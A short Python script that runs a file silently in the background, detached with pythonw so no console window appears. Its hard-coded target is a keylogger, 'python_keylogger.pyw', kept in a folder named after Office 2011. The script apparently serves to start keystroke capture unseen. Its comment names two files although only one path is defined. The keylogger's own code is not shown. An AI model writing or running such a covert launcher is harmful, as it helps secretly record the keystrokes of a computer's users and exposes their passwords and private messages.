import subprocess

def execute_in_background(file_path):
    subprocess.Popen(['pythonw', file_path], creationflags=subprocess.DETACHED_PROCESS, close_fds=True)

if __name__ == "__main__":
    # Replace 'file1.pyw' and 'file2.pyw' with the actual file paths
    file2_path = r'C:\Office 2011\key logger (complete)\python_keylogger.pyw'

    execute_in_background(file2_path)

    print("Files executed in background.")
